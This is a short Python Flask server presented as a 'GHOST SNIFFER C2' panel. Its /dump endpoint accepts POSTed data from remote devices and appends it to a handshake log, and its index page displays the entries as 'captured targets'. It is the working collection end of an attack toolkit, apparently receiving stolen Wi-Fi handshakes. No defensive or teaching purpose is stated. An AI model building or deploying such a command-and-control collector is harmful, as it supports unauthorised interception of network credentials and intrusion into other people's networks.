import os
from flask import Flask, request, render_template_string

app = Flask(__name__)
LOG_FILE = "handshakes_log.txt"

HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>GHOST SNIFFER C2</title>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
        .log-entry { border: 1px solid #00ff41; padding: 15px; margin-bottom: 10px; background: #050505; box-shadow: 0 0 5px #004400; }
        .ssid { color: #fff; font-weight: bold; }
        .status { color: #ff0000; text-transform: uppercase; }
        h1 { border-bottom: 2px solid #00ff41; padding-bottom: 10px; }
    </style>
</head>
<body>
    <h1>[ CAPTURED TARGETS ]</h1>
    {% for line in lines %}
        <div class="log-entry">> {{ line }}</div>
    {% endfor %}
</body>
</html>
'''

@app.route('/')
def index():
    lines = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            lines = f.readlines()
    return render_template_string(HTML, lines=reversed(lines))

@app.route('/dump', methods=['POST'])
def dump():
    data = request.data.decode('utf-8')
    if data.strip():
        with open(LOG_FILE, "a") as f:
            f.write(data + "\n")
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
